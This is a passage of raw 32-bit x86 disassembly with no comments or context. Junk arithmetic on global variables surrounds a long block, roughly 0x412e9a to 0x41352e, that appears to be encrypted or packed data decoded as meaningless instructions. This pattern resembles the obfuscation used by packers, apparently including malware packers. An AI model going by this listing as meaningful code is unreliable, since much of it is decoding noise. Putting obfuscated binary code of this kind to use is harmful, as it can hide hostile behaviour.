  412dac:	cmp    ecx,ebx
  412dae:	je     0x414af6
  412db4:	mov    eax,DWORD PTR [ebp-0x20]
  412db7:	sub    eax,0x3b59
  412dbc:	mov    eax,DWORD PTR [ebp-0x20]
  412dbf:	xor    ecx,ecx
  412dc1:	shld   ecx,eax,0x2
  412dc5:	xor    DWORD PTR ds:0x428401,0x4284d9
  412dcf:	shl    eax,0x2
  412dd2:	add    DWORD PTR ds:0x428439,0x4284d1
  412ddc:	xor    ecx,edx
  412dde:	cmp    DWORD PTR ds:0x4284d1,0x0
  412de5:	not    edx
  412de7:	not    edx
  412de9:	jmp    0x412e3e
  412dee:	mov    DWORD PTR ds:0x42854d,edx
  412df4:	not    edx
  412df6:	cmp    DWORD PTR ds:0x4284d1,0x0
  412dfd:	je     0x412e29
  412e03:	push   0x8204
  412e08:	push   DWORD PTR [ebp-0x28]
  412e0b:	call   DWORD PTR ds:0x42e010
  412e11:	mov    edx,DWORD PTR ds:0x428419
  412e17:	xor    DWORD PTR ds:0x428549,edx
  412e1d:	mov    edx,DWORD PTR ds:0x428569
  412e23:	sub    DWORD PTR ds:0x428565,edx
  412e29:	inc    edx
  412e2a:	adc    edx,DWORD PTR ds:0x428565
  412e30:	xor    edx,edx
  412e32:	xor    edx,DWORD PTR ds:0x428461
  412e38:	adc    DWORD PTR ds:0x428559,edx
  412e3e:	mov    edx,DWORD PTR [ebp+0x8]
  412e41:	xor    eax,edi
  412e43:	mov    edi,DWORD PTR [ebp+0xc]
  412e46:	mov    DWORD PTR ds:0x428351,0x757
  412e50:	cmp    eax,edx
  412e52:	mov    DWORD PTR ds:0x428321,0x1fab
  412e5c:	jne    0x412e74
  412e62:	cmp    ecx,edi
  412e64:	mov    DWORD PTR ds:0x428365,0x4385
  412e6e:	je     0x414af6
  412e74:	add    eax,DWORD PTR ds:0x428421
  412e7a:	mov    eax,DWORD PTR [ebp-0x1c]
  412e7d:	neg    DWORD PTR ds:0x428329
  412e83:	mov    ecx,DWORD PTR [ebp-0x1c]
  412e86:	push   0xfffffffe
  412e88:	and    DWORD PTR ds:0x428361,edx
  412e8e:	pop    ebx
  412e8f:	or     DWORD PTR ds:0x42856d,edx
  412e95:	jmp    0x4131ce
  412e9a:	imul   ebx,DWORD PTR [edi+0x1cbccb74],0xf12aa079
  412ea4:	and    BYTE PTR [esi-0x6f2c3e2b],bl
  412eaa:	mov    WORD PTR [eax-0x42],?
  412ead:	mov    esi,0xbebec4ed
  412eb2:	clc    
  412eb3:	out    0xd,eax
  412eb5:	les    eax,FWORD PTR [edi+0x21]
  412eb8:	ds or  al,0xec
  412ebc:	lods   eax,DWORD PTR ds:[esi]
  412ebd:	jnp    0x412f33
  412ebf:	pop    ecx
  412ec0:	retf   0x7da6
  412ec3:	cdq    
  412ec4:	loopne 0x412f40
  412ec6:	stos   BYTE PTR es:[edi],al
  412ec7:	xor    ecx,DWORD PTR [ecx]
  412ec9:	dec    ebx
  412eca:	into   
  412ecb:	pop    ebp
  412ecc:	popf   
  412ecd:	add    eax,0x2b5a62dc
  412ed2:	icebp  
  412ed3:	data16 jg 0x412f02
  412ed6:	fist   WORD PTR [esi-0x48]
  412ed9:	mov    esi,0x8f927fbe
  412ede:	xchg   ecx,eax
  412edf:	lods   eax,DWORD PTR ds:[esi]
  412ee0:	std    
  412ee1:	test   al,0xc0
  412ee3:	adc    ch,BYTE PTR [eax+ebx*1+0xf34644f]
  412eea:	and    edi,DWORD PTR [eax-0x5b2cc917]
  412ef0:	(bad)  
  412ef1:	sbb    al,BYTE PTR [ebx]
  412ef3:	(bad)  
  412ef4:	(bad)  
  412ef5:	and    cl,dl
  412ef7:	sub    al,0x28
  412ef9:	xlat   BYTE PTR ds:[ebx]
  412efa:	call   0x6a89:0x4affdcff
  412f01:	sub    ebx,DWORD PTR ds:0xbd641fb4
  412f07:	ja     0x412f20
  412f09:	and    ah,ch
  412f0b:	dec    edi
  412f0c:	aas    
  412f0d:	test   DWORD PTR [ecx-0x4cec0b17],ecx
  412f13:	and    DWORD PTR [ebx+0xb43893e],edx
  412f19:	aaa    
  412f1a:	mov    ah,0x2b
  412f1c:	imul   ebx,esp,0x386fd490
  412f22:	sbb    al,0xd2
  412f24:	imul   edi,DWORD PTR [edx+eax*1],0x70471903
  412f2b:	shr    DWORD PTR [edx],0x98
  412f2e:	out    dx,al
  412f2f:	inc    esi
  412f30:	fimul  DWORD PTR [esi+0x3d]
  412f33:	pop    ecx
  412f34:	int3   
  412f35:	in     al,0x4
  412f37:	mov    dl,0xd8
  412f39:	test   DWORD PTR [edi+0x8],esp
  412f3c:	jp     0x412fa6
  412f3e:	mov    ebx,0x6784924a
  412f43:	mov    ecx,0xfd5535cf
  412f48:	outs   dx,DWORD PTR ds:[esi]
  412f49:	xchg   ebp,eax
  412f4a:	mov    BYTE PTR [edi-0x48],ch
  412f4d:	add    al,0x14
  412f4f:	std    
  412f50:	in     al,dx
  412f51:	mov    al,0x90
  412f53:	cld    
  412f54:	ja     0x412fa0
  412f56:	repnz push ss
  412f58:	aas    
  412f59:	mov    ch,0xef
  412f5b:	add    dl,BYTE PTR [esi]
  412f5d:	(bad)  
  412f5e:	ja     0x412f5b
  412f60:	fcomi  st,st(6)
  412f62:	push   ebx
  412f63:	ret    
  412f64:	imul   edx,edx,0xef34c9c8
  412f6a:	mov    al,ds:0xf85cf97a
  412f6f:	or     edx,DWORD PTR [eax]
  412f71:	data16 shr BYTE PTR [ebx+0x26],cl
  412f75:	jb     0x412f2b
  412f77:	repnz and DWORD PTR [edi+0x6f],edi
  412f7b:	outs   dx,BYTE PTR ds:[esi]
  412f7c:	jnp    0x412faa
  412f7e:	aaa    
  412f7f:	mov    al,0x3a
  412f81:	loope  0x412f0b
  412f83:	hlt    
  412f84:	or     DWORD PTR [edi],0xfffffffc
  412f87:	and    esp,0xe99b44b8
  412f8d:	into   
  412f8e:	mov    cl,0x89
  412f90:	out    dx,eax
  412f91:	mov    ebp,edx
  412f93:	out    0x94,al
  412f95:	lods   eax,DWORD PTR ds:[esi]
  412f96:	xchg   cl,dh
  412f98:	and    BYTE PTR [ecx-0x6b],0x2a
  412f9c:	or     BYTE PTR [edi+0x8a1d44f],ch
  412fa2:	stos   BYTE PTR es:[edi],al
  412fa3:	mov    edi,0x764c1c48
  412fa8:	lahf   
  412fa9:	jno    0x412ffb
  412fab:	and    BYTE PTR [ebx],bl
  412fad:	push   es
  412fae:	push   cs
  412faf:	push   esp
  412fb0:	stc    
  412fb1:	inc    ebx
  412fb2:	mov    dh,0x97
  412fb4:	cmp    al,0x29
  412fb6:	outs   dx,DWORD PTR ds:[esi]
  412fb7:	push   0x3af5a5c4
  412fbc:	jg     0x412fa5
  412fbe:	je     0x412fc6
  412fc0:	arpl   WORD PTR [ebp-0x70],sp
  412fc3:	adc    esp,ebx
  412fc5:	pop    ecx
  412fc6:	adc    al,0xc
  412fc8:	ror    DWORD PTR [eax],cl
  412fca:	ror    BYTE PTR [ebx],cl
  412fcc:	repnz adc al,0x66
  412fcf:	cs jle 0x412fd0
  412fd2:	xor    al,0x8d
  412fd4:	push   ss
  412fd5:	and    DWORD PTR [edx],0x4d
  412fd8:	cmc    
  412fd9:	push   ecx
  412fda:	mov    ds:0x3e530c6f,al
  412fdf:	dec    eax
  412fe0:	add    ecx,DWORD PTR [ebx+0x4d]
  412fe3:	lock sub edx,DWORD PTR [eax]
  412fe6:	mov    ds,ecx
  412fe8:	outs   dx,DWORD PTR ds:[esi]
  412fe9:	ss into 
  412feb:	xchg   ecx,eax
  412fec:	ret    
  412fed:	mov    esi,0x9d118771
  412ff2:	std    
  412ff3:	jg     0x413058
  412ff5:	dec    esi
  412ff6:	(bad)  
  412ff7:	ficom  DWORD PTR [esi-0x78]
  412ffa:	test   DWORD PTR [esi-0x7b01c6c5],eax
  413000:	pop    ss
  413001:	outs   dx,BYTE PTR ds:[esi]
  413002:	sbb    ah,BYTE PTR [ebx-0x35]
  413005:	xor    BYTE PTR [ebp-0x69],cl
  413008:	inc    esi
  413009:	mov    WORD PTR [ecx-0x7fe85d34],fs
  41300f:	or     eax,0x9167d506
  413014:	aad    0xe4
  413016:	sub    al,0xa4
  413018:	inc    ecx
  413019:	xor    ah,BYTE PTR [eax]
  41301b:	js     0x41309c
  41301d:	or     ecx,DWORD PTR [ebx]
  41301f:	xlat   BYTE PTR ds:[ebx]
  413020:	mov    al,ds:0xf8a0b4bb
  413025:	xor    BYTE PTR [esi-0x4d],cl
  413028:	sub    eax,0x6a24d65e
  41302d:	out    dx,eax
  41302e:	inc    esi
  41302f:	adc    ebx,DWORD PTR [edx]
  413031:	jns    0x4130ad
  413033:	aas    
  413034:	xor    esp,edx
  413036:	rcr    DWORD PTR [edx-0x25],1
  413039:	pop    es
  41303a:	adc    ch,dl
  41303c:	jle    0x412ff0
  41303e:	in     al,dx
  41303f:	mov    eax,0x4e6c65d7
  413044:	adc    al,0x9
  413047:	daa    
  413048:	not    BYTE PTR [ecx]
  41304a:	sbb    al,0x8c
  41304c:	or     al,0x1e
  41304e:	mov    esi,0x7ac03f57
  413053:	stos   DWORD PTR es:[edi],eax
  413054:	cwde   
  413055:	out    0xaa,al
  413057:	cli    
  413058:	(bad)  
  413059:	fidivr WORD PTR [edi-0x4]
  41305c:	push   ebx
  41305d:	dec    eax
  41305e:	pop    es
  41305f:	pop    edi
  413060:	jge    0x4130a6
  413062:	mov    WORD PTR [esi],es
  413064:	scas   eax,DWORD PTR es:[edi]
  413065:	mov    al,ds:0xd13ed25c
  41306a:	mov    dh,0xfe
  41306c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41306d:	mov    ecx,0xfb53880e
  413072:	dec    edi
  413073:	(bad)  
  413074:	ds mov ebx,0x4792b6d3
  41307a:	clc    
  41307b:	jle    0x413017
  41307d:	xchg   esp,eax
  41307e:	dec    edi
  41307f:	loop   0x413082
  413081:	pop    eax
  413082:	arpl   cx,bp
  413084:	add    al,0x7f
  413086:	inc    eax
  413087:	add    esi,DWORD PTR [esi+0x12]
  41308a:	pop    ss
  41308b:	and    eax,0x808b5700
  413090:	fidiv  WORD PTR [esi-0x70]
  413093:	iret   
  413094:	jns    0x413075
  413096:	es call 0xbd42:0x3af140e1
  41309e:	mov    al,ds:0xa255d7c7
  4130a3:	loope  0x41310e
  4130a5:	scas   al,BYTE PTR es:[edi]
  4130a6:	adc    ebp,DWORD PTR ds:0x21d708f
  4130ac:	mov    dl,0x9f
  4130ae:	retf   0x4a14
  4130b1:	sub    al,BYTE PTR [eax-0x16]
  4130b4:	push   ecx
  4130b5:	xor    al,0xc5
  4130b7:	push   ecx
  4130b8:	cmp    cl,BYTE PTR [ebp-0x62]
  4130bb:	retf   0x214f
  4130be:	mov    WORD PTR [ebx*2-0x597aad48],fs
  4130c5:	jmp    0x17cf:0x5ed0d2ba
  4130cc:	push   edi
  4130cd:	dec    ebp
  4130ce:	arpl   WORD PTR [esi],si
  4130d0:	cli    
  4130d1:	icebp  
  4130d2:	outs   dx,BYTE PTR ds:[esi]
  4130d3:	xchg   BYTE PTR [edi],ah
  4130d5:	xchg   esi,eax
  4130d6:	mov    dl,0x22
  4130d8:	scas   al,BYTE PTR es:[edi]
  4130d9:	loope  0x4130a4
  4130db:	mov    eax,ds:0xbff34a12
  4130e0:	test   DWORD PTR fs:[ebp+0x7d142583],ebp
  4130e7:	pop    ecx
  4130e8:	inc    esi
  4130e9:	enter  0x1cfc,0xa0
  4130ed:	mov    edx,DWORD PTR [edi]
  4130ef:	add    eax,DWORD PTR [ebp-0x1cf9de3f]
  4130f5:	mov    al,0xed
  4130f7:	cdq    
  4130f8:	(bad)  
  4130f9:	cld    
  4130fa:	cmp    esp,esi
  4130fc:	add    ebp,ebx
  4130fe:	mov    WORD PTR [edi+0x28],fs
  413101:	bound  ebx,QWORD PTR ds:0xb0914d18
  413107:	sbb    bh,BYTE PTR [esi-0x48ca6574]
  41310d:	retf   
  41310e:	xchg   edx,eax
  41310f:	addr16 jge 0x413120
  413112:	adc    DWORD PTR [eax+0x4f],esi
  413115:	not    DWORD PTR [ebp*2+0x4b1d74dc]
  41311c:	cmc    
  41311d:	jmp    0xf1d6d00d
  413122:	add    eax,0xa7182ceb
  413127:	mov    bl,0x78
  413129:	add    ah,BYTE PTR [ebx]
  41312b:	jmp    0x4de4:0x75570222
  413132:	cs jp  0x41314d
  413135:	xor    cl,BYTE PTR [ebp+0x243dbdec]
  41313b:	fucom  st(3)
  41313d:	or     bh,BYTE PTR [eax-0x51]
  413140:	sbb    BYTE PTR [ecx+0x43],dh
  413143:	(bad)  
  413145:	cmp    DWORD PTR [eax-0x6d],edi
  413148:	adc    ch,bl
  41314a:	fmul   st(1),st
  41314c:	in     eax,0xf
  41314e:	or     cl,bl
  413150:	jg     0x4131a4
  413152:	jns    0x413199
  413154:	mov    ds:0x19127c4b,al
  413159:	xor    al,0xa9
  41315b:	inc    edi
  41315c:	pop    ss
  41315d:	ret    
  41315e:	jg     0x413153
  413160:	scas   al,BYTE PTR es:[edi]
  413161:	or     BYTE PTR [esi+ecx*4+0x6a9ddc29],bh
  413168:	sbb    BYTE PTR cs:[ebx-0x6901d99a],0xf1
  413170:	pop    eax
  413171:	rol    DWORD PTR [edx],cl
  413173:	mov    bl,0x6b
  413175:	jmp    0x4131b6
  413177:	gs xor esi,edx
  41317a:	(bad)  
  41317b:	xchg   ecx,eax
  41317c:	mov    al,0x56
  41317e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41317f:	or     bl,BYTE PTR [esi-0x60594d9]
  413185:	je     0x413118
  413187:	out    0x89,eax
  413189:	test   dh,al
  41318b:	loop   0x4131e3
  41318d:	inc    esi
  41318e:	mov    cl,0x38
  413190:	pop    ss
  413191:	mov    WORD PTR [ebx+ebx*2-0x9ddac41],?
  413198:	mov    cl,0x31
  41319a:	dec    edi
  41319b:	cwde   
  41319c:	cmp    bh,BYTE PTR [eax-0x26]
  41319f:	cmp    ah,BYTE PTR [eax]
  4131a1:	call   0xb18dcfc6
  4131a6:	ret    
  4131a7:	stc    
  4131a8:	jecxz  0x41317f
  4131aa:	xlat   BYTE PTR ds:[ebx]
  4131ab:	fistp  QWORD PTR [eax-0x368ff981]
  4131b1:	mov    ds:0xdba1f785,al
  4131b6:	imul   ebp,DWORD PTR [edx+0x62],0xb1b72177
  4131bd:	push   esi
  4131be:	pop    edi
  4131bf:	xor    al,0x68
  4131c1:	les    edx,FWORD PTR [ebp-0x8]
  4131c4:	jno    0x4131f2
  4131c6:	iret   
  4131c7:	push   0xffffffac
  4131c9:	sub    DWORD PTR [ebx+0x334b592d],ebx
  4131cf:	retf   
  4131d0:	xor    edi,edi
  4131d2:	add    edi,DWORD PTR ds:0x428425
  4131d8:	sub    DWORD PTR ds:0x428405,edi
  4131de:	shl    ecx,0x1e
  4131e1:	xor    DWORD PTR ds:0x428355,0x3d84
  4131eb:	mov    edi,0xa5069baf
  4131f0:	xor    eax,edi
  4131f2:	shr    eax,0x2
  4131f5:	jmp    0x41352e
  4131fa:	jmp    0x8a913c60
  4131ff:	mov    eax,0x40087bbc
  413204:	push   0xffffffd1
  413206:	xor    bh,al
  413208:	adc    BYTE PTR [esi-0x41418144],bl
  41320e:	in     eax,dx
  41320f:	les    edi,FWORD PTR [esi-0x130b042]
  413215:	mov    edi,edx
  413217:	or     BYTE PTR [ebp+0x4a],ch
  41321a:	out    0x1,eax
  41321c:	pop    ds
  41321d:	mov    ds:0xbd27c9b,al
  413222:	jo     0x4131be
  413224:	mul    DWORD PTR [edx]
  413226:	or     eax,0x25538076
  41322b:	retf   
  41322c:	pop    edi
  41322d:	pop    ss
  41322e:	jns    0x41322b
  413230:	stc    
  413231:	push   ss
  413232:	dec    esi
  413233:	mov    edx,0x20cee6f4
  413238:	icebp  
  413239:	push   eax
  41323a:	xlat   BYTE PTR ds:[ebx]
  41323b:	js     0x413225
  41323d:	sbb    DWORD PTR [ecx],ebx
  41323f:	add    BYTE PTR [ebp+edx*8+0x6f6d18e2],ah
  413246:	stos   DWORD PTR es:[edi],eax
  413247:	sbb    dh,ch
  413249:	lea    ebp,[edi-0x22]
  41324c:	jp     0x41325e
  41324e:	xor    eax,0x11f1c7ca
  413253:	aam    0xb7
  413255:	adc    al,0x7c
  413257:	icebp  
  413258:	xchg   ebx,eax
  413259:	xchg   esi,eax
  41325a:	ss add eax,0xd4162e41
  413260:	and    DWORD PTR [esi+eax*4-0x5069857c],ebp
  413267:	jmp    0x4131f2
  413269:	rcl    DWORD PTR [edx],1
  41326b:	cli    
  41326c:	jbe    0x41324e
  41326e:	ret    
  41326f:	jne    0x41327c
  413271:	enter  0x535a,0x66
  413275:	cmp    eax,0x539abea6
  41327a:	adc    DWORD PTR [ecx-0x73ac4c8d],ebp
  413280:	cwde   
  413281:	inc    ebx
  413282:	pop    ss
  413283:	fidiv  WORD PTR [edi-0x1c035b81]
  413289:	sub    BYTE PTR [esi+ebp*8+0x29ed3c13],cl
  413290:	stos   DWORD PTR es:[edi],eax
  413291:	mov    ah,0xe4
  413293:	(bad)  
  413294:	in     eax,dx
  413295:	push   cs
  413296:	popa   
  413297:	cmp    edx,esi
  413299:	into   
  41329a:	popa   
  41329b:	outs   dx,DWORD PTR ds:[esi]
  41329c:	js     0x413257
  41329e:	or     dl,0x1d
  4132a1:	ja     0x413268
  4132a3:	inc    edi
  4132a4:	adc    dl,dh
  4132a6:	xor    eax,0x4818ef6d
  4132ab:	inc    ebp
  4132ac:	loope  0x413252
  4132ae:	rol    eax,1
  4132b0:	test   BYTE PTR [ebx],0x61
  4132b3:	enter  0xea6,0x7f
  4132b7:	(bad)  
  4132b8:	jmp    DWORD PTR ds:0xfd2b437f
  4132be:	inc    edi
  4132bf:	das    
  4132c0:	push   ebp
  4132c1:	and    DWORD PTR [ebx],eax
  4132c3:	fsubr  DWORD PTR [edi+0x21]
  4132c6:	call   0xc5fe40df
  4132cb:	lods   eax,DWORD PTR ds:[esi]
  4132cc:	jl     0x4132e9
  4132ce:	das    
  4132cf:	iret   
  4132d0:	bound  ebp,QWORD PTR [ebx]
  4132d2:	push   eax
  4132d3:	aaa    
  4132d4:	sbb    ah,BYTE PTR [ecx+0x3c9c4b29]
  4132da:	call   0x9aae0a4b
  4132df:	lods   al,BYTE PTR ds:[esi]
  4132e0:	ss clc 
  4132e2:	mov    dl,0x3e
  4132e4:	add    bh,al
  4132e6:	mov    ds:0xbaec0431,al
  4132eb:	ret    0xe6b7
  4132ee:	mov    dh,0x7c
  4132f0:	into   
  4132f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132f2:	popa   
  4132f3:	sub    dl,al
  4132f5:	jle    0x41334b
  4132f7:	cmp    DWORD PTR [edi],edx
  4132f9:	jmp    0x41329d
  4132fb:	stos   DWORD PTR es:[edi],eax
  4132fc:	xrelease xchg BYTE PTR [ebp-0x78492c15],cl
  413303:	dec    edi
  413304:	mov    cl,0x7c
  413306:	add    BYTE PTR [ebx+0x38],bl
  413309:	mov    edi,0x22f07e8b
  41330e:	aam    0x7f
  413310:	add    BYTE PTR [ebp-0x3f],ch
  413313:	pop    ds
  413314:	jl     0x413315
  413316:	and    bh,bl
  413318:	les    esp,FWORD PTR [edx]
  41331a:	pop    ebp
  41331b:	in     eax,0x2d
  41331d:	sub    eax,0xe24d19d7
  413322:	rcl    cl,cl
  413324:	add    edx,esi
  413326:	lods   eax,DWORD PTR ds:[esi]
  413327:	lods   al,BYTE PTR ds:[esi]
  413328:	js     0x4132ae
  41332a:	mov    bh,BYTE PTR [ebp-0x2d]
  41332d:	out    dx,eax
  41332e:	aaa    
  41332f:	retf   0x83be
  413332:	inc    ebx
  413333:	dec    esp
  413334:	adc    ch,0xa7
  413337:	xor    DWORD PTR [edi],edx
  413339:	call   DWORD PTR [ecx]
  41333b:	inc    edi
  41333c:	xor    edx,DWORD PTR [ebp-0x15ee4a55]
  413342:	int    0x2a
  413344:	pop    ebp
  413345:	jg     0x4133ab
  413347:	jmp    0x4133a6
  413349:	jg     0x413370
  41334b:	call   0x9a355814
  413350:	add    DWORD PTR [eax-0x49],eax
  413353:	mov    DWORD PTR [edi+edi*1-0x62a9c901],ebp
  41335a:	ss cs retf 
  41335d:	mov    ch,0xbe
  41335f:	icebp  
  413360:	mov    al,0x2
  413362:	rol    DWORD PTR [eax],cl
  413364:	xchg   ebx,eax
  413365:	rcr    BYTE PTR [ebp+0x6d],1
  413368:	or     DWORD PTR [ebx+0x53],edi
  41336b:	call   0xb3ba:0x746df0e3
  413372:	push   es
  413373:	mov    ch,0x28
  413375:	fisttp WORD PTR [ebp-0x574baaa9]
  41337b:	cmc    
  41337c:	in     eax,0x5d
  41337e:	mov    ds:0xbaef989c,eax
  413383:	sub    eax,0x181e6fa0
  413388:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413389:	dec    ecx
  41338a:	adc    al,BYTE PTR [ebp+0x4a3332a2]
  413390:	loope  0x413369
  413392:	in     eax,dx
  413393:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413394:	cmp    dl,BYTE PTR [edx+0x55]
  413397:	push   0x7cc0cc1
  41339c:	mov    ecx,0x172524e
  4133a1:	push   eax
  4133a2:	adc    DWORD PTR [ecx+esi*1-0x5bfb686a],edi
  4133a9:	sbb    edi,esp
  4133ab:	enter  0xc3f4,0x45
  4133af:	pushf  
  4133b0:	push   ecx
  4133b1:	out    0x99,al
  4133b3:	int    0xde
  4133b5:	push   ebx
  4133b6:	and    DWORD PTR [esi+0x32d9727c],0x4ac37613
  4133c0:	xor    ah,BYTE PTR [eax+0x6]
  4133c3:	stos   BYTE PTR es:[edi],al
  4133c4:	fcom   DWORD PTR [edx+0x49835101]
  4133ca:	fs or  eax,esi
  4133cd:	mov    ds:0x31fb09a0,eax
  4133d2:	das    
  4133d3:	adc    ch,al
  4133d5:	jp     0x41344c
  4133d7:	imul   esp,eax,0x8bf2b988
  4133dd:	mov    BYTE PTR [edx],bh
  4133df:	jge    0x4133ea
  4133e1:	shl    BYTE PTR [ebx+0x6e],1
  4133e4:	sbb    ah,dh
  4133e6:	in     al,dx
  4133e7:	dec    ecx
  4133e8:	push   esi
  4133e9:	pop    esp
  4133ea:	push   ebx
  4133eb:	lods   eax,DWORD PTR ds:[esi]
  4133ec:	(bad)  
  4133ed:	mov    ecx,0x99cd9148
  4133f2:	ffreep st(4)
  4133f4:	and    eax,0x50332be9
  4133f9:	cld    
  4133fa:	imul   ecx,DWORD PTR ds:0x69ba2e5a,0xffffff85
  413401:	or     al,BYTE PTR [esi+ebx*1-0x7425e8f1]
  413408:	int    0x0
  41340a:	sar    ebx,1
  41340c:	mov    dh,0xdf
  41340e:	stos   BYTE PTR es:[edi],al
  41340f:	push   esp
  413410:	xchg   ebx,eax
  413411:	ins    DWORD PTR es:[edi],dx
  413412:	pop    esp
  413413:	sub    BYTE PTR [ecx+0x57a3979d],cl
  413419:	lock sahf 
  41341b:	popf   
  41341c:	sar    DWORD PTR [eax-0x4b0d4721],0xfd
  413423:	repnz xor bl,ah
  413426:	and    BYTE PTR [edx-0x68],ch
  413429:	fs scas eax,DWORD PTR es:[edi]
  41342b:	pop    ss
  41342c:	xchg   esp,eax
  41342d:	mov    dh,0x81
  41342f:	imul   ecx,DWORD PTR ds:0xc204d823,0xffffffe6
  413436:	ret    
  413437:	popf   
  413438:	(bad)  
  413439:	(bad)  
  41343c:	add    BYTE PTR [ecx-0x1671f458],al
  413442:	pusha  
  413443:	push   ss
  413444:	and    edi,eax
  413446:	stos   DWORD PTR es:[edi],eax
  413447:	loop   0x413479
  413449:	push   eax
  41344a:	or     BYTE PTR [ecx-0x76],ch
  41344d:	inc    ebx
  41344e:	add    ebx,DWORD PTR [eax+0x41]
  413451:	idiv   DWORD PTR [ecx-0x3c]
  413454:	popa   
  413455:	jnp    0x4134af
  413457:	shl    BYTE PTR [ebp-0x111cf8a8],1
  41345d:	cld    
  41345e:	popf   
  41345f:	mov    bh,0x7e
  413461:	ins    BYTE PTR es:[edi],dx
  413462:	lea    ebp,[ecx]
  413464:	arpl   WORD PTR es:[ecx+0x7ed52657],bp
  41346b:	adc    cl,BYTE PTR [edi-0x65a79e72]
  413471:	loope  0x413477
  413473:	pop    esp
  413474:	push   0xffffff81
  413476:	out    0xb,al
  413478:	scas   eax,DWORD PTR es:[edi]
  413479:	imul   edi,DWORD PTR [ebp-0x14],0xffffff9c
  41347d:	or     al,0x18
  41347f:	dec    ebp
  413480:	sbb    dh,ch
  413482:	jecxz  0x413468
  413484:	dec    edx
  413485:	pop    ecx
  413486:	repz lahf 
  413488:	(bad)  
  41348a:	push   ds
  41348b:	lock push es
  41348d:	test   al,0x22
  41348f:	inc    esp
  413490:	in     eax,0xb5
  413492:	hlt    
  413493:	jle    0x41345e
  413495:	and    bl,BYTE PTR [ecx+0x43]
  413498:	test   DWORD PTR [edi+0x7ff6532c],eax
  41349e:	sbb    ecx,DWORD PTR [edx*1+0x78fb1381]
  4134a5:	mov    ah,0x1c
  4134a7:	call   0x3bbe:0xb89c3468
  4134ae:	jbe    0x4134c3
  4134b0:	mov    al,0x49
  4134b2:	and    eax,0xccfedba1
  4134b7:	sbb    al,0xec
  4134b9:	sar    BYTE PTR [ecx-0x6bb084b4],cl
  4134bf:	pop    edi
  4134c0:	lea    ebp,[ebp-0x37a8f1ad]
  4134c6:	fwait
  4134c7:	ds stos DWORD PTR es:[edi],eax
  4134c9:	sbb    eax,0xc99015a5
  4134ce:	mov    WORD PTR [esi+edx*1+0xd],gs
  4134d2:	push   0xffffffc6
  4134d4:	mov    al,0x94
  4134d7:	lea    eax,[ebx-0x25]
  4134da:	lahf   
  4134db:	mov    bl,0xb1
  4134dd:	mov    ah,0x52
  4134df:	pop    ebp
  4134e0:	jge    0x4134f7
  4134e2:	outs   dx,DWORD PTR ds:[esi]
  4134e3:	test   al,0x7b
  4134e5:	mov    esp,0xaa03b668
  4134ea:	shl    ecx,0x9
  4134ed:	inc    esp
  4134ee:	shl    BYTE PTR [eax+ecx*1],1
  4134f1:	(bad)  
  4134f2:	repz retf 
  4134f4:	outs   dx,BYTE PTR ds:[esi]
  4134f5:	int3   
  4134f6:	mov    ch,BYTE PTR [esi]
  4134f8:	add    eax,0x52654e5a
  4134fd:	mov    dl,0xcb
  4134ff:	and    edx,DWORD PTR [ebx+0x3695a6da]
  413505:	sbb    al,0x3
  413507:	fdiv   st,st(0)
  413509:	mov    eax,ds:0xa2af8082
  41350e:	mov    cl,BYTE PTR ds:0xa659f49f
  413514:	add    DWORD PTR [edx+edi*2+0x2a05b1c5],ecx
  41351b:	jne    0x4134ac
  41351d:	stos   BYTE PTR es:[edi],al
  41351e:	push   ds
  41351f:	add    ah,dl
  413521:	xchg   DWORD PTR [eax],ecx
  413523:	icebp  
  413524:	mov    ch,0xed
  413526:	dec    edi
  413527:	fisttp DWORD PTR [esi+eiz*4+0x378f3207]
  41352e:	or     eax,ecx
  413530:	cmp    DWORD PTR ds:0x428321,0x0
  413537:	mov    DWORD PTR ds:0x428431,0x5b09
  413541:	movzx  ecx,WORD PTR ds:0x428349
  413548:	jmp    0x413626
  41354d:	mov    DWORD PTR ds:0x42835d,0x463b
  413557:	cmp    DWORD PTR ds:0x428321,0x0
  41355e:	ja     0x413594
  413564:	push   0x1092
  413569:	push   0x34c2
  41356e:	push   DWORD PTR [ebp-0x10]
  413571:	push   0x63e1
  413576:	push   0x428285
  41357b:	push   DWORD PTR [ebp-0x24]
  41357e:	call   DWORD PTR ds:0x42e0d8
  413584:	adc    DWORD PTR ds:0x4284e9,0x3ae5
  41358e:	or     ecx,DWORD PTR ds:0x428539
  413594:	mov    ecx,DWORD PTR ds:0x4284c9
  41359a:	xor    DWORD PTR ds:0x428555,ecx
  4135a0:	add    DWORD PTR ds:0x4284b5,0x73c1
  4135aa:	xor    DWORD PTR ds:0x4284c1,0x45f8
  4135b4:	cmp    DWORD PTR ds:0x4284ed,0x0
  4135bb:	mov    ecx,0x9c7
  4135c0:	mov    DWORD PTR ds:0x42833d,0x5708
  4135ca:	mov    DWORD PTR ds:0x4284c1,0x67de
  4135d4:	jmp    0x413626
  4135d9:	mov    ecx,DWORD PTR ds:0x42833d
  4135df:	cmp    DWORD PTR ds:0x4284ed,0x0
  4135e6:	jl     0x413613
  4135ec:	push   DWORD PTR [ebp-0x14]
  4135ef:	push   DWORD PTR [ebp-0x10]
  4135f2:	push   DWORD PTR [ebp-0x28]
  4135f5:	call   DWORD PTR ds:0x42e0dc
  4135fb:	adc    DWORD PTR ds:0x42841d,edx
  413601:	mov    ecx,DWORD PTR ds:0x428331
  413607:	and    DWORD PTR ds:0x42853d,ecx
  41360d:	and    DWORD PTR ds:0x428345,edx
  413613:	mov    ecx,DWORD PTR ds:0x428411
  413619:	xor    ecx,DWORD PTR ds:0x428441
  41361f:	mov    DWORD PTR ds:0x428411,ecx
  413625:	dec    ecx
  413626:	mov    DWORD PTR [ebp-0xc],eax
  413629:	cmp    DWORD PTR ds:0x428439,0x0
  413630:	mov    DWORD PTR ds:0x428415,0x7db5
  41363a:	mov    DWORD PTR ds:0x42844d,edi
  413640:	jmp    0x4136bd
  413645:	mov    ecx,DWORD PTR ds:0x428325
  41364b:	mov    eax,ds:0x42842d
  413650:	cmp    DWORD PTR ds:0x428439,0x0
  413657:	je     0x4136a7
  41365d:	push   DWORD PTR [ebp-0x20]
  413660:	push   DWORD PTR [ebp-0x28]
  413663:	push   DWORD PTR [ebp-0x28]
  413666:	push   DWORD PTR [ebp-0xc]
  413669:	push   DWORD PTR [ebp-0x18]
  41366c:	push   DWORD PTR [ebp-0xc]
  41366f:	push   DWORD PTR [ebp-0x14]
